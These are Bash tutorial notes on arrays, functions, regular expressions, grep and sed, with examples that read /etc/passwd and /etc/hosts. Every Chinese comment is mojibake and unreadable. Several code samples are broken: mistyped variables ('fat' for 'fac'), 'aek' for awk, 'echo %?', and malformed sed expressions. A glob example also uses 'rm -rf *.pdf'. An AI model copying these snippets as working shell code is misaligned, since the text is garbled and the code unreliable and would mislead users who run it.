declare -A info # å…ˆå£°æ˜æ˜¯å…³è”æ•°ç»„ info ([name]=xps [sex]=male [age]=20 [skill]=security) # èµ‹å€¼ ä½¿ç”¨ echo ${books[3]} echo ${info[name]} # æŸ¥çœ‹æ‰€æœ‰çš„æ•°ç»„ declare -a # æŸ¥çœ‹æ‰€æœ‰çš„å…³è”æ•°ç»„ declare -A # è·å–æ•°ç»„å…ƒç´ çš„ç´¢å¼•å· echo ${info[@:1]} # ä»æ•°ç»„ä¸‹æ ‡1å¼€å§‹ echo ${info[@:1:2]} # ä»æ•°ç»„ä¸‹æ ‡1å¼€å§‹ï¼Œè®¿é—®ä¸¤ä¸ªå…ƒç´  # è·å–æ‰€æœ‰çš„ç´¢å¼•key echo ${!info[@]} # ç»Ÿè®¡å…ƒç´ ä¸ªæ•° echo ${#info[@]} # æ•°ç»„ä¸­æ‰€æœ‰å…ƒæ•°ï¼ˆç­‰åŒäºï¼š ${info[*]} ï¼‰ echo ${info[@]} éå† 1.æŒ‰ç…§ä¸ªæ•°éå† 2.æŒ‰ç…§ç´¢å¼•éå† ä¾‹å­: #whileæ–¹å¼ i=0 while read line do hosts[++i]=$line #hostsæ˜¯ä¸ªæ•°ç»„ done &lt;/etc/hosts for j in ${!hosts[@]} do echo "$i: ${hosts[i]}" done ########################################################################3 # foræ–¹å¼ ä¸æ˜¯ä»¥æ¢è¡Œåˆ†å‰²ï¼ˆæŒ‰ç…§ç©ºæ ¼,tabç­‰åˆ†å‰²ï¼‰ OLD_IFS=$IFS IFS=$'\n' # è§£å†³ for i in ${!hosts[@]} do echo "$i: ${hosts[i]}" done for j in ${!hosts[@]} do echo "$i: ${hosts[i]}" done IFS=$OLD_IFS # ä¸æ˜¯å…¨æ–‡éƒ½è¦ï¼Œå¦‚æœåé—¨æƒ³ç”¨å›è½¦ä½œä¸ºåˆ†éš”ç¬¦å· å®ä¾‹ #!/bin/bash ## 1. æ€§åˆ«æ¬¡æ•°ç»Ÿè®¡ ## å…¶å®ç”¨awkä¸€è¡Œæå®š awk '{print $2}' sex.txt |sort |uniq -c ## è¿™é‡Œè¿˜æ˜¯å…ˆå­¦åŸºç¡€çš„ï¼ˆ`æŠŠè¦ç»Ÿè®¡çš„å¯¹è±¡ä½œä¸ºæ•°ç»„çš„ç´¢å¼•` ï¼Œé¦–å…ˆæ˜¯å…³è”æ•°ç»„ï¼‰ #!/bin/bash declare -A sex while read line do # é‡Œé¢çš„ç¬¬äºŒåˆ—ï¼ˆm/fï¼‰ type=`echo $line |awk '{print $2}'` let sex[$type]++ # sex[m]++ æ€§åˆ«çš„æ•°é‡å¢åŠ  done &lt; sex.txt # éå†(é€šè¿‡ç´¢å¼•) for i in ${!sex[@]} # è·å–æ‰€æœ‰çš„ç´¢å¼•key do echo "$i: ${sex[$i]}" #å˜é‡å°½é‡åŠ $ done ### 2. ç»Ÿè®¡ä¸åŒç±»å‹shellçš„æ•°é‡ # /etc/passwdä¸­ #!/bin/bash declare -A shells # å…ˆå®šä¹‰å…³è”æ•°ç»„ while read line do # é‡Œé¢çš„ç¬¬äºŒåˆ— type=`echo $line |awk -F":" '{print $7}'` #æŒ‰ç…§å†’å·åˆ†å‰² {print $NF}æœ€åä¸€åˆ— let shells[$type]++ # sex[m]++ æ€§åˆ«çš„æ•°é‡å¢åŠ  done &lt; /etc/passwd #è¾“å‡º for i in ${!shells[@]} do echo "$i: ${shells[$i]}" # /bin/bash : 5 done ### è¿™æ˜¯awkçš„å¼ºé¡¹ awk -F":" '{print $NF}' /etc/passwd |sort |uniq -c ## 3. ç»Ÿè®¡tcpè¿æ¥çŠ¶æ€æ•°é‡ #ss -an |grep 80 #!/bin/bash while : do unset status # å–æ¶ˆï¼Œ é‡æ–°å£°æ˜ declare -A status # å…ˆå®šä¹‰å…³è”æ•°ç»„ type=`ss -an |grep :80 |aek '{print $2}'` # è¦ç»Ÿè®¡çš„(æ˜¯ä¸€ä¸ªarr) for i in $type do let status[$i]++ done #è¾“å‡º for i in ${!status[@]} do echo "$i: ${status[$i]}" # SYN-SENT: 5 done sleep 1 clear done # æ€æƒ³: æŠŠè¦ç»Ÿè®¡çš„å¯¹è±¡æœ€ä¸ºç´¢å¼•ï¼Œä¸€ç›´ç´¯åŠ  ## æ‹“å±•ï¼š ## ä¸€.å¦‚æœæƒ³ä¸€ç›´çœ‹ # 1. watch -n2 test.sh # æ¯å‡ ç§’çœ‹ä¸€æ¬¡ # 2. è„šæœ¬é‡Œé¢whileå¾ªç¯(æ›´éº»çƒ¦) ## äºŒ.viméƒ¨åˆ†å¤åˆ¶ç²˜è´´ï¼š # ^V å—é€‰æ‹©ï¼Œç„¶åæŒ‰yå¤åˆ¶ï¼Œ æœ€åæ‰¾åˆ°åœ°æ–¹pç²˜è´´ å…­.å‡½æ•°å®šä¹‰ # F1: å‡½æ•°å(){ åŠŸèƒ½ } # F2: funcion å‡½æ•°å{ åŠŸèƒ½ } è°ƒç”¨ è°ƒç”¨1 #ä¾‹å­ï¼šé˜¶ä¹˜ #!/bin/env bash factorial(){ fat=1 for((i=1;i&lt;=50;i++)) do fac=$[$fac*$i] done echo "5çš„é˜¶ä¹˜:$fac" } factorial # è°ƒç”¨ è°ƒç”¨2 #!/bin/env bash factorial(){ fat=1 for((i=1;i&lt;=$num;i++)) do fac=$[$fac*$i] done echo "$numçš„é˜¶ä¹˜:$fac" } num=5 # è°ƒç”¨ä¹‹å‰å…ˆå®šä¹‰å˜é‡ factorial è°ƒç”¨3 #!/bin/env bash factorial(){ fat=1 for i in `seq $1` do let fac*=$i done echo "$1çš„é˜¶ä¹˜:$fac" } factorial $1 # ä½ç½®å˜é‡ï¼Œè°ƒç”¨ è°ƒç”¨4 # å¦‚æœå‡½æ•°å†å¦ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œå…ˆæ‰§è¡Œä¸€ä¸‹ï¼Œåé¢å†è°ƒç”¨ ./f1.sh è¿”å›å€¼ #!/bin/env bash fun2(){ read -p "enter a number:" num let 2*$num return $[2*$num] } fun2 echo "funcion return value: %?" # ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›å€¼ï¼ˆå‡½æ•°å€¼æœ€åä¸€æ¡å‘½ä»¤çš„è¿”å›çš„çŠ¶æ€ç ï¼‰ echo "funcion return: $?" # å‡½æ•°çš„è¿”å›å€¼(ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ï¼Œä½†æ˜¯é»˜è®¤shellè¿”å›ç ,æœ€å¤§ä¸èƒ½è¶…è¿‡255) å¦‚æœæƒ³è¿”å›å­—ç¬¦ä¸²ç­‰: å‡½æ•°çš„è¾“å‡º #!/bin/env bash fun2(){ read -p "enter a number:" num echo $[2*$num] # echo } result=`fun2` # ä½¿ç”¨å‡½æ•°çš„è¾“å‡º echo "return_out value: $result" å‚æ•°çš„ä¼ é€’ 1.ä½ç½®å‚æ•° #!/bin/env bash if [ $# -ne 3 ];then # å¦‚æœå‚æ•°ä¸æ˜¯ä¸‰ä¸ª echo "Usage: `basename $0`par1 par2 par3 " exit fi function parm_func(){ echo "$(($1 * $2 * s3))" } result=`parm_func $1 $2 $3` # åˆ†æ¸…ï¼šç¨‹åºçš„ä½ç½®å‚æ•°ï¼Œå‡½æ•°çš„ä½ç½®å‚æ•° echo "result is: $result" 2.æ•°ç»„ #!/bin/env bash num=(1,2,3,4,5) #echo "${num[@]}" #æ‰“å°æ‰€æœ‰å…ƒç´  arr_parm() { local fa=1 ## å±€éƒ¨å˜é‡ï¼Œåªåœ¨å‡½æ•°å†…éƒ¨ç”Ÿæ•ˆ for i in "$@" #for i in $* do let fa*=$i done echo "$fa" } #arr_parm ${num[@]} arr_parm ${num[*]} # æ•°ç»„æ‰€æœ‰ å…ƒç´ å€¼ # æ‹“å±•ï¼š # for i in $* # æ‰€æœ‰å‚æ•° # for i ä¼ æ•°ç»„åˆ°å‡½æ•°ä¸­ â€“&gt; è¿ç®— â€“&gt; è¾“å‡ºæ•°ç»„å½¢å¼ #!/bin/env bash num=(1,2,3,4,5) array() { #echo "æ‰€æœ‰å‚æ•°: $*" local new_arr=(`echo $*`) #local new_arr=($*) local i for ((i=0;i&lt;$#;i++)) do out_arr[$i]=$[ ${[$i]}*5 ] done echo "${out_arr[*]}" } result=`array${num[*]}` echo ${result[*]} #!/bin/env bash num=(1,2,3,4,5) array() { local i local new_arr=() for i in $* do new_arr[j++]=$[$i*5] done echo "${new_arr[*]}" } result=`array${num[*]}` echo ${result[*]} # å‡½æ•°æ¥æ”¶ä½ç½®å‚æ•° $1 $2 $3 # å‡½æ•°æ¥æ”¶æ•°ç»„å‚æ•° $* æˆ– $@ #å‡½æ•°å°†æ¥æ”¶åˆ°çš„æ‰€æœ‰å‚æ•°èµ‹å€¼ç»™æ•°ç»„ new_arr=($*) ä¸ƒ.æ­£åˆ™å¤§å¤šæ•°ç¨‹åºä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼è¢«æ”¾åœ¨ä¸¤ä¸ªæ­£æ–œæ ä¹‹é—´, æ¯”å¦‚ï¼š/L[oO]ve/ å…¥é—¨å°ä¾‹å­ # ç®€å•å®ä¾‹ï¼ˆä¸ä¸¥è°¨çš„ä¾‹å­ï¼Œæˆ‘ä»¬å†™shellè„šæœ¬æ²¡å¿…è¦å†™é‚£ä¹ˆå¤æ‚ï¼Œæˆ‘ä»¬çš„è„šæœ¬æ˜¯ç»™è‡ªå·±ç”¨çš„å¤šï¼‰ åŒ¹é…æ•°å­—ï¼š ^[0-9]+$ åŒ¹é…Emailï¼š [a-z0-9_]+@[a-z0-9]+\. åŒ¹é…IPï¼š [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} æˆ–è€… [[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]{1,3} # egrep '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /etc/sysconfig/network-scripts/ifcfg-eth0 æ­£åˆ™ å…ƒå­—ç¬¦ æ³¨æ„å’Œshellçš„å…ƒå­—ç¬¦æ˜¯ä¸å¤ªä¸€æ ·çš„ # ç”±æ‰§è¡Œæ¨¡å¼åŒ¹é…çš„æ“ä½œçš„ç¨‹åºæ¥è§£æï¼Œæ¯”å¦‚viï¼Œgrepï¼Œsedï¼Œawkï¼Œpython # åªè¦ä¸æ˜¯shellï¼Œå°±æ˜¯æ­£åˆ™çš„å…ƒå­—ç¬¦ rm -rf *.pdf # shellä¸­çš„*ï¼Œ åŒ¹é…ä»»æ„ grep 'c*' /etc/passwd # cå‡ºç°0æ¬¡æˆ–è€…å¤šæ¬¡ egrep 'c+' /etc/passwd # +è¦ä½¿ç”¨egrepæˆ–åæ–œæ  vimä¸­æ›¿æ¢ï¼š `:%s/\&lt;[tT]om\>/TOM/g` # å°–æ‹¬å·æ‹¬èµ·æ¥çš„æ˜¯å•è¯ ## ä¾‹å­ï¼š grep "sh$" /etc/passwd grep "ro*t" /etc/passwd grep "^[rot]" /etc/passwd # ä»¥ræˆ–oæˆ–tå¼€å¤´çš„ 1.åŸºæœ¬å…ƒå­—ç¬¦ ^ è¡Œé¦–å®šä½ç¬¦ ^love $ è¡Œä½å®šä½ç¬¦ love$ . åŒ¹é…å•ä¸ªå­—ç¬¦ l..e * åŒ¹é…å‰å¯¼ç¬¦0åˆ°å¤šæ¬¡ ab*love .* ä»»æ„å¤šä¸ªå­—ç¬¦ [] åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä¸€ä¸ªå­—ç¬¦ [lL]ove [-] åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä¸€ä¸ªå­—ç¬¦ [a-z0-9]ove [^] åŒ¹é…ä¸å†æŒ‡å®šç»„å†…çš„ä¸€ä¸ªå­—ç¬¦ [^a-z0-9]ove \ ç”¨æ¥è½¬ä¹‰å…ƒå­—ç¬¦ love\. \&lt; è¯é¦–å®šä½ç¬¦ \&lt;love \> è¯å°¾å®šä½ç¬¦ love\> \(..\) åŒ¹é…ç¨åä½¿ç”¨çš„å­—ç¬¦çš„æ ‡ç­¾ :%s/172.16.130.1/172.16.130.5/ :%s/\(172.16.130.\)1/\15/ :%s/\(172.\)\(16.\)\(130.\)1/\1\2\35/ :3,9s/\(.*\)/#\1/ # æŠŠç¬¬3-9è¡Œæ•´è¡Œæ³¨é‡Šæ‰ # å¤§æ‹¬å·æ¯ä¸€åŠå‰é¢è¦åŠ æ–œçº¿è®°å¾— x\{m\} å­—ç¬¦xé‡å¤å‡ºç°mæ¬¡ o\{5\} x\{m,\} å­—ç¬¦xé‡å¤å‡ºç°mæ¬¡ä»¥ä¸Š o\{5,\} x\{m,n\} å­—ç¬¦xé‡å¤å‡ºç°mæ¬¡ o\{5,10\} 2.æ‹“å±•æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦ + åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå‰å¯¼å­—ç¬¦ [a-z]+ove ? åŒ¹é…é›¶ä¸ªæˆ–ä¸€ä¸ªå‰å¯¼å­—ç¬¦ lo?ve # oå‡ºç°0æ¬¡æˆ–1æ¬¡ ss -an |egrep ':80:22\>' a|b åŒ¹é…aæˆ–b love|hate () ç»„ å­—ç¬¦ loveablle|rs love(able|rs)ov+ (ov)+ ov+ # é‡Œé¢å†…å®¹ä½œä¸ºä¸€ä¸ªæ•´ä½“ (..)(..)\1\2 æ ‡ç­¾åŒ¹é…å­—ç¬¦ (love)able\1er # ä¸å¸¦æ–œçº¿ x{m} å­—ç¬¦xé‡å¤å‡ºç°mæ¬¡ o{5} x{m,} å­—ç¬¦xé‡å¤è‡³å°‘mæ¬¡ o{5,} x{m,n} å­—ç¬¦xé‡å¤måˆ°næ¬¡ o{5,10} 3.POSIXå­—ç¬¦ç±» ï¼ˆç±»ä¼¼äºshellä¸­ç¯å¢ƒå˜é‡ï¼Œå·²ç»å®šä¹‰å¥½çš„ï¼‰ [:alnum:] å­—æ¯ä¸æ•°å­—å­—ç¬¦ [[:alnum:]]+ # å¤–é¢çš„æ–¹æ‹¬å·æ˜¯åŒ…é‡Œé¢çš„ [:alpha:] å­—æ¯å­—ç¬¦ï¼ˆåŒ…æ‹¬å¤§å°å†™å­—æ¯ï¼‰ [[:alpha:]]{4} [:blank:] ç©ºæ ¼ä¸åˆ¶è¡¨ç¬¦ [[:blank:]]* [:digit:] æ•°å­— [[:digit:]]? [:lower:] å°å†™å­—æ¯ [[:lower:]]{5,} [:upper:] å¤§å†™å­—æ¯ [[:upper:]]+ [:punct:] æ ‡ç‚¹ç¬¦å· [[:punct:]] [:space:] åŒ…æ‹¬æ¢è¡Œç¬¦ã€å›æ’¤ç­‰åœ¨å†…çš„æ‰€æœ‰ç©ºç™½ [[:space:]]+ å¸¦æ‹¬å·ä¸ä¸å¸¦æ‹¬å·ï¼š æ­£åˆ™åŒ¹é…å®ä¾‹ï¼švimä¸­æŸ¥æ‰¾æ›¿æ¢ # ç©ºè¡Œï¼š /^$/ /^[\t]*$/ # æ³¨é‡Šè¡Œï¼š /^#/ /^[\t]*#/ grep grep æ–‡ä»¶ä¸­æŸ¥æ‰¾æŒ‡å®šçš„æ­£åˆ™è¡¨è¾¾å¼ egrep æ‹“å±•çš„egrepï¼Œæ”¯æŒæ›´å¤šçš„æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦ fgrep å›ºå®šgrep(fixed grep),æœ‰æ—¶ä¹Ÿè¢«ç§°ä½œå¿«é€Ÿ(fast grep), å®ƒæŒ‰å­—é¢è§£é‡Šæ‰€æœ‰çš„å­—ç¬¦ #è¿‡æ»¤ï¼ˆå°½é‡åŠ å¼•å·ï¼‰ grep [é€‰é¡¹] PATTERN æ–‡ä»¶ æ–‡ä»¶ æ–‡ä»¶ grep -q "root" /etc/passwd : echo $? # è¿”å›å€¼ï¼š # 0 æ‰¾åˆ° # 1 æ²¡æ‰¾åˆ° # 2 æ‰¾ä¸åˆ°æŒ‡å®šæ–‡ä»¶ # grepçš„è¾“å…¥å¯ä»¥æ¥è‡ªï¼šæ–‡ä»¶ã€æ ‡å‡†è¾“å…¥ã€ç®¡é“ ss -an |grep ":22$" ll |grep '^d' # æ‰¾å‡ºç›®å½• ä½¿ç”¨çš„å…ƒå­—ç¬¦ grepï¼š ä½¿ç”¨åŸºæœ¬å…ƒå­—ç¬¦é›† ^, $, ., *, [], [^], \&lt;\>, \(\), \{\}, \+, egrepï¼š ä½¿ç”¨æ‰©å±•å…ƒå­—ç¬¦é›† ?, +, {}, |, () # Note: grepä¹Ÿå¯ä»¥ä½¿ç”¨æ‰©å±•å…ƒå­—ç¬¦é›†ï¼Œä»…éœ€å†è¿™äº›å…ƒå­—ç¬¦å‰ç½®ä¸€ä¸ªåæ–œçº¿(å°–å·ä¸è¡Œ) \w æ‰€æœ‰å­—æ¯ä¸æ•°å­—ï¼Œç§°ä¹‹ä¸ºå­—ç¬¦ï¼Œå³ [a-zA-Z0-9] \W ä¸ä¸Šé¢ç›¸åï¼Œéå­—ç¬¦ [^a-zA-Z0-9] \b è¯è¾¹ç•Œ # grep -E æˆ– egrep grepé€‰é¡¹ -v å–åï¼Œåªæ˜¾ç¤ºä¸åŒ¹é…çš„ -i å¿½ç•¥å¤§å°å†™ -l åªåˆ—å‡ºåŒ¹é…è¡Œæ‰€åœ¨çš„æ–‡ä»¶å(å“ªäº›æ–‡ä»¶é‡Œé¢æœ‰è¿™äº›åŒ¹é…) -n å†æ¯ä¸€è¡Œå‰é¢åŠ ä¸Šä»–æ‰€åœ¨æ–‡ä»¶ä¸­çš„ç›¸å¯¹è¡Œå· -c æ˜¾ç¤ºæˆåŠŸåŒ¹é…çš„è¡Œæ•° -s ç¦æ­¢æ˜¾ç¤ºæ–‡ä»¶ä¸å­˜åœ¨æˆ–æ–‡ä»¶ä¸å¯è¯»çš„é”™è¯¯ä¿¡æ¯ -q é™é»˜ --color é¢œè‰² -R, -r é€’å½’é’ˆå¯¹ç›®å½• -o åªæ˜¾ç¤ºåŒ¹é…çš„å†…å®¹ -B å‰å‡ è¡Œ grep -C2 'root' /etc/passwd -A åå‡ è¡Œ -C ä¸Šä¸‹å‡ è¡Œ nmap --help |grep '\-u' # æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£é‡Œçš„-u å…«.sedsed: æµç¼–è¾‘å™¨ï¼Œåœ¨çº¿çš„ã€éäº¤äº’å¼çš„ç¼–è¾‘å™¨ï¼ˆè€Œviæ˜¯äº¤äº’å¼çš„ï¼‰ sedå·¥ä½œæµç¨‹ æ–‡æœ¬æ–‡ä»¶ -&gt; sedçš„æ¨¡å¼ç©ºé—´(ç¼“å†²åŒº) â€“&gt; è¾“å‡º å‘½ä»¤æ ¼å¼ #sed [options] 'cmd' file(s) sed [options] -f scriptfile file(s) sedä¸ç®¡æ˜¯å¤Ÿæ‰¾åˆ°æŒ‡å®šçš„æ¨¡å¼ï¼Œä»–çš„é€€å‡ºçŠ¶æ€éƒ½æ˜¯0ã€‚ åªæœ‰å½“å‘½ä»¤è¯­æ³•å­˜åœ¨é”™è¯¯æ—¶å€™ï¼Œæ‰æ˜¯é0 å¯ä»¥åœ¨å‘½ä»¤è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨è„šæœ¬é‡Œé¢ä½¿ç”¨ sed 'd' /etc/test # d åˆ é™¤ sed '4d' /etc/test # 4d åˆ é™¤ç¬¬å››è¡Œ # i ä¿®æ”¹æ–‡ä»¶(ä¸æ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Š) æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ æ”¯æŒçš„å…ƒå­—ç¬¦ # åŸºæœ¬å…ƒå­—ç¬¦é›†: ^, $, ., *, [], [^], \&lt;\>, \(\), \{\} # æ‰©å±•å…ƒå­—ç¬¦é›†: ?, +, {}, |, () ä½¿ç”¨æ‰©å±•å…ƒå­—ç¬¦çš„æ–¹å¼ sed --help|grep '\-r' # \+ sed -r åŸºæœ¬ç”¨æ³•ï¼š sed -r '' /etc/test # '' æ²¡ä»»ä½•åŠ¨ä½œ sed -r 'd' /etc/test sed -r 'p' /etc/test # p æ‰“å° sed -r -n 'p' /etc/test sed -r -n '/root/p' /etc/test # -n é™é»˜æ–¹å¼ # ä¸Šé¢å››ç§ä¸å»ºè®®ç”¨(æ‰“å°è¿™ç§äº‹æƒ…ç”¨ä¸ç€sedï¼Œæœ‰åˆ«çš„æ‰“å°å°±è¡Œ) ### ä¸‹é¢çš„åŠŸèƒ½æ‰é‡ç‚¹å­¦ sed -r 's/root/xps' /etc/test # æ‰€æœ‰è¡ŒæŸ¥æ‰¾æ›¿æ¢,rootæ¢æˆå¤§å°å†™ï¼ˆåªæ›¿æ¢ä¸€æ¬¡ï¼‰ sed -r 's/root/xps/g' /etc/test # g å…¨å±€ sed -r 's/root/xps/gi' /etc/test # i å¿½ç•¥å¤§å°å†™ sed -r '/root/d' /etc/test # æ²¡æœ‰så°±æ˜¯æŸ¥æ‰¾ï¼Œ æŸ¥æ‰¾å¸¦rootçš„è¡Œï¼Œç„¶ååˆ é™¤ sed -r '\#root#d' /etc/test # æŸ¥æ‰¾ï¼šå¯ä»¥ä½¿ç”¨#ç­‰ç¬¦å·-->ä¸ä¸€å®šè¦æ–œçº¿ï¼Œä½†æ˜¯å‰é¢è¦åŠ \è½¬ä¹‰ï¼›æŸ¥æ‰¾æ›¿æ¢:ä¸ç”¨è½¬ä¹‰ åœ°å€(å®šå€) #!/bin/bash # ç”¨äºå†³å®šå¯¹å“ªäº›è¡Œè¿›è¡Œç¼–è¾‘ã€‚åœ°å€å½¢å¼å¯ä»¥æ˜¯æ•°å­—ã€æ­£åˆ™æˆ–äºŒè€…çš„ç»“åˆ(å¦‚æœæ²¡æœ‰æŒ‡å®š,sedå°†å¤„ç†è¾“å…¥æ–‡ä»¶ä¸­çš„æ‰€æœ‰è¡Œ) sed -r 'd' /etc/test sed -r '3d' /etc/test sed -r '1,3d' /etc/test sed -r '/root/d' /etc/test # åˆ é™¤rootçš„è¡Œ sed -r 'root/,5d' /etc/test # ä»rootè¡Œå¼€å§‹ï¼Œåˆ°ç¬¬5è¡Œåˆ é™¤ sed -r 's/root/xps/g' /etc/test # æ›¿æ¢ sed -r '/^adm/,20d' /etc/test # ä»admå¼€å¤´çš„é‚£ä¸€è¡Œï¼Œåˆ é™¤åˆ°ç¬¬20è¡Œ sed -r '/^adm/,+20d' /etc/test # ä»admå¼€å¤´çš„é‚£ä¸€è¡Œï¼Œå†å¾€ååˆ é™¤20è¡Œ sed -r '/2,5d' /etc/test # ç¬¬äºŒè¡Œåˆ°ç¬¬äº”è¡Œ sed -r '/root/d' /etc/test # å¸¦rootçš„è¡Œåˆ é™¤ sed -r '/root/!d' /etc/test # é™¤äº†rootè¡Œä»¥å¤–éƒ½åˆ é™¤ sed -r '1~2d' /etc/test # åˆ é™¤æ‰€æœ‰å¥‡æ•°è¡Œ(ä»1å¼€å§‹ï¼Œæ¯éš”ä¸¤è¡Œåˆ ) sed -r '0~2d' /etc/test # åˆ é™¤æ‰€æœ‰å¶æ•°è¡Œ # æ‹“å±•ï¼š vimä¸­ï¼š ä½¿ç”¨ `:r /etc/passwd` æ¥è¯»å–æ–‡ä»¶å†…å®¹ å‘½ä»¤ # å‘Šè¯‰sedå¯¹æŒ‡å®šè¡Œè¿›è¡Œä½•ç§æ“ä½œ a åœ¨å½“å‰è¡Œåæ·»åŠ ä¸€è¡Œæˆ–å¤šè¡Œ c ç”¨æ–°æ–‡æœ¬ä¿®æ”¹(æ›¿æ¢)å½“å‰è¡Œä¸­çš„æ–‡æœ¬ d åˆ é™¤è¡Œ i åœ¨å½“å‰è¡Œå‰æ’å…¥æ–‡æœ¬ l åˆ—å‡ºéæ‰“å°å­—ç¬¦ p æ‰“å°è¡Œ n è¯»å…¥ä¸‹ä¸€è¾“å…¥è¡Œï¼Œå¹¶ä»ä¸‹ä¸€æ¡å‘½ä»¤è€Œä¸æ˜¯ç¬¬ä¸€æ¡å‘½ä»¤å¼€å§‹å¯¹å…¶çš„å¤„ç† q ç»“æŸæˆ–é€€å‡ºsed ! å–å(å¯¹æ‰€é€‰è¡Œä»¥å¤–çš„æ‰€æœ‰è¡Œåº”ç”¨) s ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢å¦ä¸€ä¸ª s æ›¿æ¢æ ‡å¿— g åœ¨è¡Œå†…è¿›è¡Œå…¨å±€æ›¿æ¢ i å¿½ç•¥å¤§å°å†™ r ä»æ–‡ä»¶ä¸­è¯» w å°†è¡Œå†™å…¥æ–‡ä»¶ y å°†å­—ç¬¦è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ï¼ˆä¸æ”¯æŒæ­£åˆ™ï¼‰ h æŠŠæ¨¡å¼ç©ºé—´é‡Œçš„å†…å®¹å¤åˆ¶åˆ°æš‚å­˜ç¼“å†²åŒº(è¦†ç›–) H æŠŠæ¨¡å¼ç©ºé—´é‡Œçš„å†…å®¹æ”¯æ¶åˆ°æš‚å­˜ç¼“å†²åŒºä¸­ g å–å‡ºæš‚å­˜ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå°†å…¶å¤åˆ¶åˆ°æ¨¡å¼ç©ºé—´ï¼Œè¦†ç›–è¯¥å¤„åŸæœ‰å†…å®¹ G å–å‡ºæš‚å­˜ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå°†å…¶å¤åˆ¶åˆ°æ¨¡å¼ç©ºé—´ï¼Œè¿½åŠ åœ¨åŸæœ‰å†…å®¹åé—¨ x äº¤æ¢æš‚å­˜ç¼“å†²åŒºåŸŸæ¨¡å¼ç©ºé—´çš„å†…å®¹ ä¾‹å­ ## ä¾‹å­ # d åˆ é™¤ sed -r '3d' datefile # åˆ é™¤ç¬¬ä¸‰è¡Œ sed -r '3d' datefile sed -r '3{d;}' datefile sed -r '3d{h:d}' datefile # å…ˆä¿å­˜ï¼Œå†åˆ é™¤ sed -r '3,$d' datefile # åˆ é™¤3åˆ°æœ€åä¸€è¡Œ sed -r '$d' datefile # åˆ é™¤æœ€åä¸€è¡Œ sed -r '/nrth/d' datefile # åˆ é™¤æ»¡è¶³è¿™ä¸ªåŒ¹é…çš„è¡Œ # s æ›¿æ¢ sed -r 's/west/north/g' datefile sed -r 's/^west/north/' datefile sed -r 's[0-9][0-9]$/&amp;.5' datefile # &amp;ä»£è¡¨åœ¨æŸ¥æ‰¾ä¸²ä¸­åŒ¹é…åˆ°çš„å†…å®¹ # æ‹“å±•vimä¸­åœ¨æŸè¡Œçš„åé—¨åŠ ä¸Šxxxï¼š :3,5s/.*/&amp;XXX/g #vimæ‹“å±•1: :%s/.*/#&amp;/g åœ¨æ‰€æœ‰è¡Œå‰é¢åŠ æ³¨é‡Š #vimæ‹“å±•1: :3,5s/~/#&amp;/ å’Œsedæ˜¯ä¸€æ ·çš„ sed -r '%s/(.)(.)(.*)/\1xxx\2\3/' passwd # æŠŠæ¯è¡Œç¬¬äºŒä¸ªå­—ç¬¦å‰é¢åŠ xxx sed -r 's/(Mar)got/\1inane/g' datefile # r è¯»æ–‡ä»¶ sed -r 's/Suan/r /etc/newfile' datefile # åˆ°Suanè¿™ä¸€è¡Œçš„æ—¶å€™ï¼Œè¯»å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ sed -r '2r /etc/hosts' a.txt # å¤„ç†åˆ°ç¬¬äºŒè¡Œçš„æ—¶å€™ï¼Œè¯»å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ sed -r '/2r /etc/hosts' a.txt # /2 å¸¦æœ‰2çš„æ—¶å€™ï¼Œè¯»å…¥... # w å†™æ–‡ä»¶ sed -r '/north/w newfile' datafile # æŠŠnorthçš„è¡Œä¿å­˜åˆ°æ–°æ–‡ä»¶ä¸­å» sed -r '3,$w /new.txt' datafile # ç¬¬ä¸‰è¡Œåˆ°æœ€åä¸€è¡Œï¼Œä¿å­˜... # a è¿½åŠ  sed -r '/root/a 1111111' datafile # æœ‰rootçš„è¡Œï¼Œå°±åœ¨åé¢æ·»åŠ 11111 sed -r '2a/ 1111111' datafile # ç¬¬äºŒè¡Œï¼Œæ·»åŠ  111111111 # i åœ¨å‰é¢æ’å…¥ sed -r '/root/i 1111111' datafile # æœ‰rootçš„è¡Œï¼Œå°±åœ¨å‰é¢æ·»åŠ 11111 sed -r '2i/ 1111111' datafile # ç¬¬äºŒè¡Œï¼Œåœ¨å‰é¢æ·»åŠ  111111111 # c ä¿®æ”¹æ›¿æ¢ sed -r '2c/ 1111111' datafile # ç¬¬äºŒè¡Œï¼Œæ›¿æ¢ä¸º 111111111 # n è·å–ä¸‹ä¸€è¡Œå‘½ä»¤ sed -r '/eastern/{n; d}' datafile # è¿™è¡Œæ²¡æœ‰æ˜æ˜¾æ ‡å¿—ï¼Œç”¨ä¸Šé¢æ˜æ˜¾çš„éš”å±±æ‰“ç‰› # G g H h æš‚å­˜å’Œå–ç”¨å‘½ä»¤ sed -r '1h;$G' /etc/hosts # å¤„ç†åˆ°ç¬¬ä¸€è¡Œæ—¶å€™ï¼Œæš‚å­˜ï¼›åˆ°æœ€åä¸€è¡Œï¼Œå–è¿‡æ¥ ï¼ˆç¬¬ä¸€è¡Œå¤åˆ¶åˆ°æœ€åä¸€è¡Œï¼‰ sed -r '1{h;d};$G' /etc/hosts # ç¬¬ä¸€è¡Œç§»åŠ¨åˆ°æœ€åä¸€è¡Œ sed -r '1h;2,$G' /etc/hosts # 